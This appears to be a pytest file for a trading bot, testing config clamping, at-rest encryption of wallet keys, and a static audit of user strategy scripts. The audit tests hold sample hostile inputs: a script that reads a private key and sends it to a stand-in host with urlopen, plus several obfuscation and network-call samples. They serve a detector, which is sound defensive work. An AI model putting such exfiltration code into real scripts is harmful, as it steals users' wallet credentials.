"""Tests for config validation/clamping and at-rest credential encryption."""
from __future__ import annotations

import asyncio
import base64
import json

import pytest

import polymarket_auth as ka
from config import DEFAULT_CONFIG, merge_with_defaults


# ───────── config validation / clamping ───────────────────────────────


# A throwaway Ed25519 seed; nothing on the venue knows it.
_SECRET = base64.b64encode(bytes(range(32))).decode()
_KEY_ID = "00000000-0000-4000-8000-000000000000"


def test_oversized_fraction_is_clamped():
    assert merge_with_defaults({"max_size_fraction": 5.0})["max_size_fraction"] == 1.0
    assert merge_with_defaults({"min_cash_reserve_fraction": -2})["min_cash_reserve_fraction"] == 0.0


def test_entry_price_cents_clamped_and_ordered():
    c = merge_with_defaults({"min_entry_price_cents": 80, "max_entry_price_cents": 20})
    assert c["min_entry_price_cents"] == 20 and c["max_entry_price_cents"] == 80
    assert merge_with_defaults({"max_entry_price_cents": 500})["max_entry_price_cents"] == 99


def test_min_size_cannot_exceed_max_size():
    c = merge_with_defaults({"min_size_fraction": 0.5, "max_size_fraction": 0.1})
    assert c["min_size_fraction"] <= c["max_size_fraction"]


def test_stop_loss_forced_nonpositive_take_profit_nonnegative():
    # A positive "max daily loss" means the user wants to stop after losing
    # that much (−50), NOT to disable the breaker. Coerce to negative magnitude
    # so a stray sign can never silently turn protection off.
    assert merge_with_defaults({"stop_loss_on_day": 50})["stop_loss_on_day"] == -50.0
    assert merge_with_defaults({"stop_loss_on_day": -50})["stop_loss_on_day"] == -50.0
    assert merge_with_defaults({"stop_loss_on_day": 0})["stop_loss_on_day"] == 0.0  # 0 = off
    # Same coercion for the crypto circuit-breaker.
    assert merge_with_defaults(
        {"crypto15m_daily_loss_limit": 75})["crypto15m_daily_loss_limit"] == -75.0
    assert merge_with_defaults({"take_profit_on_day": -10})["take_profit_on_day"] == 0.0


def test_garbage_value_falls_back_to_default():
    assert merge_with_defaults({"max_size_fraction": "abc"})["max_size_fraction"] == \
        DEFAULT_CONFIG["max_size_fraction"]


def test_crypto15m_knobs_clamped():
    c = merge_with_defaults({"crypto15m_entry_threshold": 1.5, "crypto15m_order_size": 0})
    assert c["crypto15m_entry_threshold"] == 1.0
    assert c["crypto15m_order_size"] == 1


def test_crypto15m_maker_and_hours_knobs_clamped():
    c = merge_with_defaults({
        "crypto15m_entry_style": "yolo",
        "crypto15m_maker_cancel_min": 99,
        "crypto15m_hours_start_utc": -5,
        "crypto15m_hours_end_utc": 99,
    })
    assert c["crypto15m_entry_style"] == "taker"   # whitelist -> default (taker)
    assert c["crypto15m_maker_cancel_min"] == 15.0
    assert c["crypto15m_hours_start_utc"] == 0
    assert c["crypto15m_hours_end_utc"] == 24


def test_camelcase_keys_still_clamped():
    # renderer sends camelCase; clamping must apply after the snake conversion.
    assert merge_with_defaults({"maxSizeFraction": 9.0})["max_size_fraction"] == 1.0


# ───────── credential at-rest encryption ───────────────────────────────


def test_dpapi_roundtrip():
    if not ka._dpapi_available():
        pytest.skip("DPAPI is Windows-only")
    enc = ka._dpapi_encrypt(b"super-secret")
    assert enc != b"super-secret"
    assert ka._dpapi_decrypt(enc) == b"super-secret"


def test_credentials_encrypted_at_rest(tmp_path, monkeypatch):
    monkeypatch.setenv("KRYPT_POLYBOT_US_USERDATA", str(tmp_path))
    ka.reset_credential_cache()
    ka.set_env("mainnet")

    pk = _SECRET
    ka.save_credentials(_KEY_ID, pk, "mainnet")

    # Round-trips.
    assert ka.get_key_id() == _KEY_ID

    # On Windows the file on disk is encrypted: marker present, key not plaintext.
    raw = ka._wallet_key_file("mainnet").read_bytes()
    if ka._dpapi_available():
        assert raw.startswith(ka._DPAPI_MARKER)
        assert _SECRET.encode() not in raw

    ka.reset_credential_cache()


def test_keyring_encrypts_at_rest_when_no_dpapi(tmp_path, monkeypatch):
    # On macOS/Linux (no DPAPI) the wallet key must be Fernet-encrypted with a
    # master key kept in the OS keychain — never written in plaintext. Force the
    # non-Windows path and stub the keychain with an in-memory store.
    monkeypatch.setenv("KRYPT_POLYBOT_US_USERDATA", str(tmp_path))
    store: dict = {}
    monkeypatch.setattr(ka, "_dpapi_available", lambda: False)
    monkeypatch.setattr(ka, "_keyring_set",
                        lambda acct, val: store.__setitem__(acct, val) or True)
    monkeypatch.setattr(ka, "_keyring_get", lambda acct: store.get(acct))
    monkeypatch.setattr(ka, "_keyring_master_cache", None)
    ka.reset_credential_cache()
    ka.set_env("mainnet")

    pk = _SECRET
    ka.save_credentials(_KEY_ID, pk, "mainnet")

    raw = ka._wallet_key_file("mainnet").read_bytes()
    assert raw.startswith(ka._KEYRING_MARKER)          # encrypted + tagged
    assert _SECRET.encode() not in raw                          # private key NOT on disk
    assert ka._KEYRING_MASTER_ACCOUNT in store           # master key lives in keychain

    # Decrypts back via the keychain master key (drop caches to force a re-read).
    ka.reset_credential_cache()
    monkeypatch.setattr(ka, "_keyring_master_cache", None)
    assert ka.get_key_id() == _KEY_ID


def test_credentials_fall_back_to_plaintext_without_any_backend(tmp_path, monkeypatch):
    # Headless Linux / no Secret Service: neither DPAPI nor keychain is usable.
    # Saving must still SUCCEED (never block the user) — as plaintext, no marker.
    monkeypatch.setenv("KRYPT_POLYBOT_US_USERDATA", str(tmp_path))
    monkeypatch.setattr(ka, "_dpapi_available", lambda: False)
    monkeypatch.setattr(ka, "_keyring_set", lambda acct, val: False)   # no backend
    monkeypatch.setattr(ka, "_keyring_get", lambda acct: None)
    monkeypatch.setattr(ka, "_keyring_master_cache", None)
    ka.reset_credential_cache()
    ka.set_env("mainnet")

    pk = _SECRET
    ka.save_credentials(_KEY_ID, pk, "mainnet")             # must not raise

    raw = ka._wallet_key_file("mainnet").read_bytes()
    assert not raw.startswith(ka._KEYRING_MARKER)
    assert not raw.startswith(ka._DPAPI_MARKER)
    ka.reset_credential_cache()
    assert ka.get_key_id() == _KEY_ID


def test_legacy_plaintext_upgraded_to_keychain_on_read(tmp_path, monkeypatch):
    # A pre-existing plaintext key file is transparently re-encrypted the first
    # time it's read, once a keychain backend is available.
    monkeypatch.setenv("KRYPT_POLYBOT_US_USERDATA", str(tmp_path))
    store: dict = {}
    monkeypatch.setattr(ka, "_dpapi_available", lambda: False)
    monkeypatch.setattr(ka, "_keyring_set",
                        lambda acct, val: store.__setitem__(acct, val) or True)
    monkeypatch.setattr(ka, "_keyring_get", lambda acct: store.get(acct))
    monkeypatch.setattr(ka, "_keyring_master_cache", None)
    ka.reset_credential_cache()
    ka.set_env("mainnet")

    f = ka._wallet_key_file("mainnet")
    f.parent.mkdir(parents=True, exist_ok=True)
    pk = _SECRET
    f.write_bytes(json.dumps({"keyId": _KEY_ID, "secretKey": pk}).encode())   # plaintext on disk
    assert not f.read_bytes().startswith(ka._KEYRING_MARKER)

    addr = ka.get_key_id()                              # read triggers in-place upgrade
    assert addr == _KEY_ID
    assert f.read_bytes().startswith(ka._KEYRING_MARKER)  # now encrypted at rest


def test_verify_signer_signs_offline():
    # The packaged-build self-test (`backend --selftest`) relies on this: it must
    # import the crypto chain and produce a real Ed25519 signature, all offline.
    assert ka.verify_signer() == "ed25519 ok"


# ── user-script risk audit ────────────────────────────────────────────────
# The language sandbox is gone (see script_sandbox): scripts are full Python,
# and this static audit is what stands in its place. The escapes the old AST
# whitelist chased — frame walks, str.format traversal — are no longer
# "blocked", so what matters now is that the audit REPORTS the things that
# actually cost a user money, loudly enough to stop them arming the script.
import script_audit as _sa


def test_audit_is_quiet_about_an_ordinary_strategy():
    code = (
        "def decide(ctx):\n"
        "    x = sorted([3, 1, 2])\n"
        "    log(f'lo {x[0]}')\n"
        "    if (ctx.get('minsLeft') or 99) < 2:\n"
        "        return {'side': 'up', 'price': 'ask', 'size': 3}\n"
        "    return None\n"
    )
    r = _sa.audit(code)
    assert r["ok"] and r["critical"] == 0 and not r["findings"], r


def test_audit_flags_network_egress():
    r = _sa.audit("import requests\ndef decide(ctx):\n    return None\n")
    assert not r["ok"] and "network" in r["categories"]


def test_audit_flags_the_app_wallet_module_by_name():
    r = _sa.audit("import polymarket_auth\ndef decide(ctx):\n    return None\n")
    assert not r["ok"] and "wallet" in r["categories"]
    assert any("API KEY" in f["message"] for f in r["findings"]), r["findings"]


def test_audit_flags_credential_shaped_names():
    r = _sa.audit(
        "def decide(ctx):\n    private_key = ctx.get('x')\n    return None\n")
    assert not r["ok"] and "wallet" in r["categories"]


def test_wallet_plus_network_is_called_out_as_exfiltration():
    # Either half alone has innocent readings. Together they are the shape of
    # a key-stealing script, and the audit must say so in one sentence rather
    # than leave the user to assemble it from a list.
    r = _sa.audit(
        "import urllib.request\n"
        "def decide(ctx):\n"
        "    k = ctx.get('private_key')\n"
        "    urllib.request.urlopen('http://x.example/' + str(k))\n"
        "    return None\n"
    )
    assert "exfiltration" in r["categories"]
    assert r["findings"][0]["category"] == "exfiltration", r["findings"][0]
    assert "key-stealing" in r["findings"][0]["message"]


def test_audit_flags_obfuscation_itself():
    # A static scan cannot see through obfuscation, so hiding is the finding.
    for code in (
        "import base64\ndef decide(ctx):\n    return None\n",
        "def decide(ctx):\n    return exec('x=1')\n",
        "def decide(ctx):\n    return getattr(ctx, 'a' + 'b')\n",
        "def decide(ctx):\n    return __import__('os')\n",
    ):
        r = _sa.audit(code)
        assert not r["ok"] and "dynamic" in r["categories"], code


def test_audit_flags_an_encoded_payload_literal():
    blob = "QUJDREVG" * 40          # >200 chars, base64 alphabet
    r = _sa.audit("def decide(ctx):\n    p = '" + blob + "'\n    return None\n")
    assert not r["ok"] and "dynamic" in r["categories"]


def test_audit_flags_process_and_filesystem_writes():
    r = _sa.audit(
        "import subprocess\n"
        "def decide(ctx):\n"
        "    open('x.txt', 'w').write('hi')\n"
        "    return None\n"
    )
    assert not r["ok"]
    assert "process" in r["categories"] and "filesystem" in r["categories"]


def test_audit_sees_through_import_aliases():
    r = _sa.audit(
        "import requests as r\n"
        "def decide(ctx):\n    r.post('http://x.example')\n    return None\n")
    assert not r["ok"] and "network" in r["categories"]
    assert any("requests.post" in f["message"] for f in r["findings"]), r["findings"]


def test_audit_reports_a_syntax_error_instead_of_claiming_clean():
    # "Nothing found" on unparseable code would read as a clean bill of health.
    r = _sa.audit("def decide(ctx)\n    return None\n")
    assert not r["ok"] and not r["parsed"]
    assert "not audited" in r["summary"]


def test_audit_never_claims_a_script_is_safe():
    # The wording matters: this tool cannot prove safety and must not imply it.
    r = _sa.audit("def decide(ctx):\n    return None\n")
    assert "not proof it is safe" in r["summary"]
